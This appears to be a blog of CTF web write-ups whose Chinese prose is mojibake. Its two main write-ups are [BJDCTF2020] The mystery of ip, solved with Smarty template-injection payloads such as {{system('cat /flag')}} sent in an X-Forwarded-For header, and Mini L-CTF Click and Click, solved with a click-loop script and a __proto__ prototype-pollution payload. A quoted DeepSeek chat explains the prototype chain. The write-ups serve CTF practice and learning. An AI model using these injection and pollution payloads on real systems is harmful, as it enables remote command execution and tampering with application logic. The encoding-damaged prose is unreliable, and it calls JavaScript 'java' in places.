<h1 id="2019-å¼ºç½‘æ¯-é«˜æ˜çš„é»‘å®¢"><a href="#2019-å¼ºç½‘æ¯-é«˜æ˜çš„é»‘å®¢" class="headerlink" title="2019 å¼ºç½‘æ¯ é«˜æ˜çš„é»‘å®¢"></a>2019 å¼ºç½‘æ¯ é«˜æ˜çš„é»‘å®¢</h1><p>ä¸‹æºç çœ‹äº†ä¸€çœ¼å“å“­äº†ï¼Œå‡ åƒä¸ªphpæ–‡ä»¶<br>ç½‘ä¸Šçš„wpè¯´æ˜¯ç”¨è„šæœ¬æ¥æµ‹è¯•æ¯ä¸ªphpæ–‡ä»¶é‡Œç•™ä¸‹çš„é©¬èƒ½å¦ç”¨<br>æ²¡åšï¼Œè®°ä¸€ä¸‹æ€è·¯  </p>
<h1 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h1><p>æ‰“å¼€é¢˜ç›®å‘ç°æœ‰flagä¸€æ ï¼Œç‚¹å¼€å‘ç°ä¼šæ˜¾ç¤º<br>Your IP is : 192.168.122.15<br>bpæŠ“çˆ†å°±çŸ¥é“äº†  </p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /flag.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: node5.buuoj.cn:<span class="hljs-number">25798</span><br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">129</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6668</span>.<span class="hljs-number">71</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span><br><span class="hljs-attribute">Referer</span>: http://node5.buuoj.cn:<span class="hljs-number">25798</span>/index.php<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br<br><span class="hljs-attribute">Connection</span>: keep-alive<br><br></code></pre></td></tr></table></figure>
<p>æ˜æ˜æ˜¯æ­£å¸¸çš„è¯·æ±‚å¤´å•Š  </p>
<p>æ‰“å¼€hintçœ‹çœ‹ï¼Œé‡Œé¢æœ‰è¯´ï¼š  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- Do you know why i know your ip? --&gt;</span><br></code></pre></td></tr></table></figure>
<p>æƒ³åˆ°äº†æ˜¯è¦æ·»åŠ ipï¼Œä½†æ˜¯å¿˜äº†è¯¥æ€ä¹ˆè‡ªå®šä¹‰è¯·æ±‚ip<br>ä¸Šç½‘æœ<br>æ˜¯<br>X-Forwarded-For:</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /flag.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: node5.buuoj.cn:<span class="hljs-number">25798</span><br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">129</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6668</span>.<span class="hljs-number">71</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br<br><span class="hljs-attribute">Connection</span>: keep-alive<br><span class="hljs-attribute">X</span>-Forwarded-For: <span class="hljs-number">111.111.111.111</span><br></code></pre></td></tr></table></figure>
<p>æˆåŠŸå›æ˜¾æŒ‡å®šip<br>ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¼ äº†ä¸€æ¬¡;å°±å†ä¹Ÿä¸èƒ½æŒ‡å®šipæ¥å›æ˜¾äº†  </p>
<p>ç®—äº†çœ‹wpå§<br>çœ‹äº†åŠå¤©ç«Ÿç„¶æ˜¯æ¨¡æ¿æ³¨å…¥  </p>
<p>ä¼ äº†ä¸€æ¬¡ä¼ äº†ä¸€æ¬¡;å°±å†ä¹Ÿä¸èƒ½æŒ‡å®šipæ¥å›æ˜¾äº†<br>è¿™ä¸ªé—®é¢˜ç”¨bpçš„æ·»åŠ è¯·æ±‚å¤´æ¥è§£å†³<br>ç…§ç€wpåšå°±è¡Œ</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">ls</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">Your IP is :</span><br><span class="language-xml">Fatal error: Uncaught --&gt; Smarty Compiler: Syntax error in template &quot;string:</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">ls</span>&#125;&#125;</span><span class="language-xml">&quot; on line 1 &quot;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">ls</span>&#125;&#125;</span><span class="language-xml">&quot; unknown tag &#x27;ls&#x27; &lt;-- thrown in /var/www/html/libs/sysplugins/smarty_internal_templatecompilerbase.php on line 1</span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">X-Forwarded-For: </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">ls</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">Your IP is : bootstrap</span><br><span class="language-xml">css</span><br><span class="language-xml">flag.php</span><br><span class="language-xml">header.php</span><br><span class="language-xml">hint.php</span><br><span class="language-xml">img</span><br><span class="language-xml">index.php</span><br><span class="language-xml">jquery</span><br><span class="language-xml">libs</span><br><span class="language-xml">templates_c</span><br><span class="language-xml">templates_c			</span><br><span class="language-xml"></span><br><span class="language-xml">X-Forwarded-For: </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">ls</span> /)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">Your IP is : <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>Fatal error<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span>:  Uncaught  --<span class="hljs-symbol">&amp;gt;</span> Smarty Compiler: Syntax error in template <span class="hljs-symbol">&amp;quot;</span>string:</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">ls</span> /)&#125;&#125;</span><span class="language-xml"><span class="hljs-symbol">&amp;quot;</span>  on line 1 <span class="hljs-symbol">&amp;quot;</span></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">ls</span> /)&#125;&#125;</span><span class="language-xml"><span class="hljs-symbol">&amp;quot;</span>  - Unexpected <span class="hljs-symbol">&amp;quot;</span>)<span class="hljs-symbol">&amp;quot;</span> <span class="hljs-symbol">&amp;lt;</span>-- </span><br><span class="language-xml">thrown in <span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>/var/www/html/libs/sysplugins/smarty_internal_templatecompilerbase.php<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span> on line <span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>1</span><br><span class="language-xml"></span><br><span class="language-xml">X-Forwarded-For: </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">&#x27;ls /&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">Your IP is : bin</span><br><span class="language-xml">dev</span><br><span class="language-xml">etc</span><br><span class="language-xml">flag</span><br><span class="language-xml">home</span><br><span class="language-xml">lib</span><br><span class="language-xml">media</span><br><span class="language-xml">mnt</span><br><span class="language-xml">opt</span><br><span class="language-xml">proc</span><br><span class="language-xml">root</span><br><span class="language-xml">run</span><br><span class="language-xml">sbin</span><br><span class="language-xml">srv</span><br><span class="language-xml">sys</span><br><span class="language-xml">tmp</span><br><span class="language-xml">usr</span><br><span class="language-xml">var</span><br><span class="language-xml">var				</span><br><span class="language-xml"></span><br><span class="language-xml">X-Forwarded-For: </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">&#x27;cat /flag&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">//æ‹¿åˆ°flag</span><br></code></pre></td></tr></table></figure>
<p>Flaskå¯èƒ½å­˜åœ¨Jinjia2æ¨¡ç‰ˆæ³¨å…¥æ¼æ´<br>PHPå¯èƒ½å­˜åœ¨Twigæ¨¡ç‰ˆæ³¨å…¥æ¼æ´<br>æºwp<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44037296/article/details/111410565">https://blog.csdn.net/weixin_44037296/article/details/111410565</a></p>
<hr>
<h2 id="title-note-35date-2025-05-14-18-04-40tags-web"><a href="#title-note-35date-2025-05-14-18-04-40tags-web" class="headerlink" title="title: note-35date: 2025-05-14 18:04:40tags: web"></a>title: note-35<br>date: 2025-05-14 18:04:40<br>tags: web</h2><h1 id="Mini-L-CTF-Click-and-Click"><a href="#Mini-L-CTF-Click-and-Click" class="headerlink" title="Mini L-CTF Click and Click"></a>Mini L-CTF Click and Click</h1><p>å½“åˆæ²¡åšå‡ºæ¥ï¼Œå»è¥¿ç”µCTFå¹³å°å¤ç°<br>å®˜æ–¹wpï¼š<br>å…ˆç”¨JavaScriptåœ¨æµè§ˆå™¨æ§åˆ¶å°åˆ·å¤Ÿ10000  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">but = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;#app &gt; main &gt; div &gt; button&quot;</span>)<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) &#123;<br>    but.<span class="hljs-title function_">click</span>();<br>&#125;<br></code></pre></td></tr></table></figure>
<p>åœ¨bpä¸Šçœ‹åˆ° http å†å²è®°å½•<br>å‘ç°æ˜¯æ²¡50æ¬¡å‘ä¸€æ¬¡åŒ…<br>è¿‡äº†1000æ¬¡åæœåŠ¡å™¨ä¸€ç›´å›æ˜¾â€œæŒ‰çš„å¤ªå¿«äº†â€<br>å›æ˜¾å†…å®¹ï¼š  </p>
<figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs d">ä»€ä¹ˆå«â€œå‰åç«¯åˆ†ç¦»â€å•Šï¼Ÿï¼ˆæˆ˜æœ¯åä»°ï¼‰<br><br><span class="hljs-keyword">if</span> ( req.<span class="hljs-keyword">body</span>.point.amount == <span class="hljs-number">0</span> || req.<span class="hljs-keyword">body</span>.point.amount == <span class="hljs-literal">null</span>) &#123; <span class="hljs-keyword">delete</span> req.<span class="hljs-keyword">body</span>.point.amount &#125;<br><br>æ¡ä»¶åˆ¤æ–­ï¼šæ£€æŸ¥ req.<span class="hljs-keyword">body</span>.point.amount çš„å€¼æ˜¯å¦æ˜¯ <span class="hljs-number">0</span> æˆ– <span class="hljs-literal">null</span>ã€‚<br>æ“ä½œï¼šå¦‚æœæ»¡è¶³æ¡ä»¶ï¼Œåˆ é™¤ req.<span class="hljs-keyword">body</span>.point.amount å±æ€§ã€‚<br></code></pre></td></tr></table></figure>
<p>å®˜æ–¹çš„æœ€ç»ˆpayloadï¼š</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br>  <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;set&quot;</span>,<br>  <span class="hljs-string">&quot;point&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;amount&quot;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<br>      <span class="hljs-string">&quot;amount&quot;</span>: <span class="hljs-number">10000</span><br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>çœ‹å®˜æ–¹wpæ€è·¯ï¼Œå°±æ˜¯set amountä¸ºé›¶ï¼Œè§¦å‘åˆ é™¤amount<br>æ­¤æ—¶å› ä¸ºamountå·²ç»è¢«åˆ é™¤ï¼Œå½“è°ƒç”¨åˆ°pointå¯¹è±¡é‡Œçš„amountå±æ€§æ—¶ä¼šæŸ¥è¯¢ä¸åˆ°ï¼Œ<br>æ­¤æ—¶javaçš„ç‰¹æ€§æ˜¯ä¼šå»æŸ¥è¯¢ä»–çš„çˆ¶å¯¹è±¡æ˜¯å¦æœ‰amountè¿™ä¸ªå±æ€§ï¼Œè‹¥æ˜¯æœ‰ï¼Œamountå°±ä¼šé‡‡ç”¨ä»–çˆ¶å¯¹è±¡çš„å€¼    </p>
<p>DeepSeek:è¿™ä¸ª__proto__ æ˜¯å¯¹è±¡è®¿é—®åŸå‹é“¾çš„å…¥å£ï¼Œé€šè¿‡å®ƒå¯ä»¥ç›´æ¥ä¿®æ”¹å¯¹è±¡çš„â€œçˆ¶å¯¹è±¡â€ï¼ˆåŸå‹ï¼‰  </p>
<p>è€Œæˆ‘ä»¬é€šè¿‡è®¾ç½®__proto__çš„å±æ€§ï¼Œç»™ä»–æ·»åŠ ä¸€ä¸ªamountå±æ€§ï¼Œå½“javaæŸ¥è¯¢pointçš„amountå±æ€§æ—¶å› ä¸ºè¢«åˆ é™¤ï¼Œæ‰€ä»¥å°±ä¼šå»æŸ¥è¯¢__proto__<br>æ­¤æ—¶è‹¥æˆ‘ä»¬ç»™äº†__proto__ä¸€ä¸ªamountå€¼ï¼Œè¿™æ—¶__proto__çš„amountå€¼å°±ä¼šå˜æˆpointçš„amountå€¼ï¼Œè¾¾åˆ°äº†ç»•è¿‡  </p>
<h2 id="ä¸deepseekçš„å¯¹è¯"><a href="#ä¸deepseekçš„å¯¹è¯" class="headerlink" title="ä¸deepseekçš„å¯¹è¯"></a>ä¸deepseekçš„å¯¹è¯</h2><h2 id="æˆ‘çš„æé—®ï¼š"><a href="#æˆ‘çš„æé—®ï¼š" class="headerlink" title="æˆ‘çš„æé—®ï¼š"></a>æˆ‘çš„æé—®ï¼š</h2><p>æˆ‘å¯¹__proto__çš„ä½œç”¨ä¸å¤ªç†è§£ï¼Œè¯´æ˜ä¸€ä¸‹å•Šï¼Œæˆ‘æ²¡æ¥è§¦è¿‡å¤šå°‘java</p>
<h2 id="AIå›å¤ï¼š"><a href="#AIå›å¤ï¼š" class="headerlink" title="AIå›å¤ï¼š"></a>AIå›å¤ï¼š</h2><p>å·²æ·±åº¦æ€è€ƒï¼ˆç”¨æ—¶ 22 ç§’ï¼‰</p>
<p>å¥½çš„ï¼Œç”¨æˆ·ä¹‹å‰ä¸€ç›´åœ¨è¯¢é—®å…³äºCTFé¢˜ç›®ä¸­çš„åŸå‹é“¾æ±¡æŸ“æ¼æ´ï¼Œç‰¹åˆ«æ˜¯å…³äº__proto__çš„ä½œç”¨ã€‚ç°åœ¨ç”¨æˆ·æåˆ°è‡ªå·±å¯¹__proto__çš„ä½œç”¨ä¸å¤ªç†è§£ï¼Œå¹¶ä¸”æåˆ°æ²¡æœ‰æ¥è§¦è¿‡å¤šå°‘JavaScriptï¼Œè¿™è¯´æ˜ç”¨æˆ·å¯èƒ½æ˜¯ä¸€ä¸ªåˆšå¼€å§‹å­¦ä¹ JavaScriptçš„æ–°æ‰‹ï¼Œæˆ–è€…åœ¨CTFä¸­é‡åˆ°äº†è¿™ä¸ªæ¦‚å¿µï¼Œä½†ç¼ºä¹ç›¸å…³çš„èƒŒæ™¯çŸ¥è¯†ã€‚</p>
<p>é¦–å…ˆï¼Œæˆ‘éœ€è¦ç¡®è®¤ç”¨æˆ·çš„æ ¸å¿ƒé—®é¢˜ï¼šç†è§£__proto__åœ¨JavaScriptä¸­çš„ä½œç”¨ï¼Œä»¥åŠå®ƒå¦‚ä½•å¯¼è‡´åŸå‹é“¾æ±¡æŸ“ã€‚ç”¨æˆ·ä¹‹å‰çš„é—®é¢˜å·²ç»æ¶‰åŠåˆ°äº†åŸå‹é“¾æ±¡æŸ“çš„æ”»å‡»æ­¥éª¤ï¼Œä½†å¯èƒ½å¯¹åŸå‹é“¾æœ¬èº«çš„æ¦‚å¿µè¿˜ä¸æ¸…æ¥šï¼Œå°¤å…¶æ˜¯ä½œä¸ºJavaScriptçš„æ–°æ‰‹ï¼Œéœ€è¦ä»åŸºç¡€è®²èµ·ã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘éœ€è¦è€ƒè™‘å¦‚ä½•ç”¨ç®€å•æ˜“æ‡‚çš„è¯­è¨€è§£é‡ŠåŸå‹é“¾å’Œ__proto__ã€‚ç”¨æˆ·å¯èƒ½å¯¹é¢å‘å¯¹è±¡ç¼–ç¨‹ä¸­çš„ç»§æ‰¿æ¦‚å¿µä¸å¤ªç†Ÿæ‚‰ï¼Œæˆ–è€…å¯¹JavaScriptçš„åŸå‹ç»§æ‰¿æœºåˆ¶æ„Ÿåˆ°é™Œç”Ÿã€‚å› æ­¤ï¼Œéœ€è¦ç”¨ç±»æ¯”å’Œå…·ä½“çš„ä¾‹å­æ¥å¸®åŠ©ç†è§£ã€‚</p>
<p>å¯èƒ½çš„æ­¥éª¤åŒ…æ‹¬ï¼š</p>
<p>1. è§£é‡ŠJavaScriptä¸­çš„å¯¹è±¡å’ŒåŸå‹é“¾çš„åŸºæœ¬æ¦‚å¿µã€‚</p>
<p>2. è¯´æ˜__proto__å±æ€§æ˜¯ä»€ä¹ˆï¼Œä»¥åŠå®ƒå¦‚ä½•æŒ‡å‘å¯¹è±¡çš„åŸå‹ã€‚</p>
<p>3. æ¼”ç¤ºå¦‚ä½•é€šè¿‡ä¿®æ”¹__proto__æ¥å½±å“å…¶ä»–å¯¹è±¡ï¼Œè¿›è€Œå¯¼è‡´åŸå‹é“¾æ±¡æŸ“ã€‚</p>
<p>4. ç»“åˆä¹‹å‰çš„CTFé¢˜ç›®ï¼Œè¯´æ˜æ”»å‡»è€…å¦‚ä½•åˆ©ç”¨è¿™ä¸€ç‚¹ã€‚</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”¨æˆ·å¯èƒ½æ²¡æœ‰æ¥è§¦è¿‡æ„é€ å‡½æ•°æˆ–prototypeå±æ€§ï¼Œæ‰€ä»¥éœ€è¦é¿å…ä½¿ç”¨è¿‡äºä¸“ä¸šçš„æœ¯è¯­ï¼Œæˆ–è€…å¦‚æœå¿…é¡»ä½¿ç”¨ï¼Œè¦ç¡®ä¿æœ‰è¶³å¤Ÿçš„è§£é‡Šã€‚åŒæ—¶ï¼Œç”¨æˆ·å¯èƒ½éœ€è¦æ›´å¤šçš„å®é™…ä¾‹å­æ¥ç†è§£æŠ½è±¡çš„æ¦‚å¿µã€‚</p>
<p>å¦å¤–ï¼Œç”¨æˆ·ä¹‹å‰çš„å¯¹è¯ä¸­æåˆ°â€œæ²¡æ¥è§¦è¿‡å¤šå°‘javaâ€ï¼Œè¿™é‡Œå¯èƒ½å­˜åœ¨ç¬”è¯¯ï¼Œç”¨æˆ·å¯èƒ½æŒ‡çš„æ˜¯JavaScriptï¼Œè€Œä¸æ˜¯Javaã€‚éœ€è¦ç¡®è®¤è¿™ä¸€ç‚¹ï¼Œä½†åœ¨ä¸Šä¸‹æ–‡ä¸­åº”è¯¥æ˜¯JavaScriptï¼Œå› ä¸ºè®¨è®ºçš„æ˜¯CTFä¸­çš„JSæ¼æ´ã€‚</p>
<p>åœ¨è§£é‡Šè¿‡ç¨‹ä¸­ï¼Œåº”é¿å…ä½¿ç”¨å¤æ‚çš„ä»£ç ç¤ºä¾‹ï¼Œæˆ–è€…å¦‚æœä½¿ç”¨ä»£ç ï¼Œè¦é€è¡Œè§£é‡Šå…¶ä½œç”¨ã€‚åŒæ—¶ï¼Œä½¿ç”¨æ¯”å–»æˆ–ç°å®ä¸­çš„ç±»æ¯”æ¥å¸®åŠ©ç”¨æˆ·å½¢æˆç›´è§‚çš„ç†è§£ï¼Œæ¯”å¦‚å®¶æ—æ ‘ã€ç»§æ‰¿é“¾ç­‰ã€‚</p>
<p>è¿˜éœ€è¦å¼ºè°ƒä¸ºä»€ä¹ˆåŸå‹é“¾æ±¡æŸ“æ˜¯å±é™©çš„ï¼Œä»¥åŠåœ¨å®é™…å¼€å‘ä¸­å¦‚ä½•é˜²æ­¢è¿™ç§æ¼æ´ã€‚è¿™ä¸ä»…èƒ½å¸®åŠ©ç”¨æˆ·ç†è§£æ”»å‡»åŸç†ï¼Œè¿˜èƒ½å¢å¼ºä»–ä»¬çš„å®‰å…¨æ„è¯†ã€‚</p>
<p>æœ€åï¼Œæ€»ç»“å…³é”®ç‚¹ï¼Œç¡®ä¿ç”¨æˆ·èƒ½å¤ŸæŠ“ä½æ ¸å¿ƒæ¦‚å¿µï¼Œå¹¶å¯èƒ½æä¾›è¿›ä¸€æ­¥çš„å­¦ä¹ èµ„æºæˆ–ç»ƒä¹ å»ºè®®ï¼Œä»¥å·©å›ºç†è§£ã€‚</p>
<p>å¥½çš„ï¼æˆ‘æ¥ç”¨æœ€ç®€å•çš„æ–¹å¼è§£é‡Š <code>__proto__</code> å’ŒåŸå‹é“¾çš„æ¦‚å¿µï¼Œå³ä½¿ä½ å®Œå…¨æ²¡æ¥è§¦è¿‡ JavaScript ä¹Ÿèƒ½ç†è§£ã€‚æˆ‘ä»¬ä»â€œå¯¹è±¡â€å’Œâ€œç»§æ‰¿â€è¿™ä¸¤ä¸ªæ ¸å¿ƒæ¦‚å¿µè¯´èµ·ã€‚</p>
<hr>
<h3 id="1-JavaScriptä¸­çš„å¯¹è±¡"><a href="#1-JavaScriptä¸­çš„å¯¹è±¡" class="headerlink" title="1. JavaScriptä¸­çš„å¯¹è±¡"></a><strong>1. JavaScriptä¸­çš„å¯¹è±¡</strong></h3><p>JavaScript ä¸­å‡ ä¹æ‰€æœ‰ä¸œè¥¿éƒ½æ˜¯<strong>å¯¹è±¡</strong>ï¼ˆæ¯”å¦‚æ•°å­—ã€å­—ç¬¦ä¸²ã€æ•°ç»„ç­‰éƒ½å¯ä»¥ç”¨å¯¹è±¡çš„å½¢å¼æ“ä½œï¼‰ã€‚å¯¹è±¡å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªâ€œç›’å­â€ï¼Œé‡Œé¢è£…ç€<strong>å±æ€§</strong>ï¼ˆé”®å€¼å¯¹ï¼‰ã€‚ä¾‹å¦‚ï¼š</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js">    <span class="hljs-comment">// ä¸€ä¸ªç®€å•çš„å¯¹è±¡</span><br>    <span class="hljs-keyword">const</span> cat = &#123;<br>      <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;å–µå–µ&quot;</span>,<br>      <span class="hljs-attr">age</span>: <span class="hljs-number">2</span>,<br>      <span class="hljs-attr">say</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;å–µ~&quot;</span>); &#125;<br>    &#125;;<br><br>è¿™ä¸ª <span class="hljs-string">`cat`</span> å¯¹è±¡æœ‰å±æ€§ <span class="hljs-string">`name`</span>ã€<span class="hljs-string">`age`</span> å’Œæ–¹æ³• <span class="hljs-string">`say()`</span>ã€‚<br></code></pre></td></tr></table></figure>
<hr>
<h3 id="2-ä»€ä¹ˆæ˜¯åŸå‹é“¾ï¼ˆPrototype-Chainï¼‰ï¼Ÿ"><a href="#2-ä»€ä¹ˆæ˜¯åŸå‹é“¾ï¼ˆPrototype-Chainï¼‰ï¼Ÿ" class="headerlink" title="2. ä»€ä¹ˆæ˜¯åŸå‹é“¾ï¼ˆPrototype Chainï¼‰ï¼Ÿ"></a><strong>2. ä»€ä¹ˆæ˜¯åŸå‹é“¾ï¼ˆPrototype Chainï¼‰ï¼Ÿ</strong></h3><p>JavaScript çš„ç»§æ‰¿æœºåˆ¶æ˜¯é€šè¿‡<strong>åŸå‹é“¾</strong>å®ç°çš„ã€‚ç®€å•æ¥è¯´ï¼š</p>
<ul>
<li><p><strong>æ¯ä¸ªå¯¹è±¡éƒ½æœ‰ä¸€ä¸ªâ€œçˆ¸çˆ¸â€ï¼ˆåŸå‹å¯¹è±¡ï¼‰</strong>ã€‚</p>
</li>
<li><p>å¦‚æœè®¿é—®ä¸€ä¸ªå¯¹è±¡çš„å±æ€§ï¼ˆæ¯”å¦‚ <code>cat.color</code>ï¼‰ï¼Œä½†å¯¹è±¡è‡ªå·±æ²¡æœ‰è¿™ä¸ªå±æ€§ï¼ŒJavaScript ä¼šè‡ªåŠ¨å»å®ƒçš„â€œçˆ¸çˆ¸â€å¯¹è±¡é‡Œæ‰¾ã€‚</p>
</li>
<li><p>å¦‚æœâ€œçˆ¸çˆ¸â€ä¹Ÿæ²¡æœ‰ï¼Œå°±å»â€œçˆ·çˆ·â€å¯¹è±¡é‡Œæ‰¾â€¦â€¦ç›´åˆ°æ‰¾åˆ°æˆ–è€…æ²¡æœ‰æ›´é«˜å±‚çš„â€œç¥–å…ˆâ€ï¼ˆåŸå‹é“¾é¡¶ç«¯æ˜¯ <code>null</code>ï¼‰ã€‚</p>
</li>
</ul>
<p>è¿™ç§<strong>é“¾å¼æŸ¥æ‰¾æœºåˆ¶</strong>å°±æ˜¯åŸå‹é“¾ã€‚</p>
<hr>
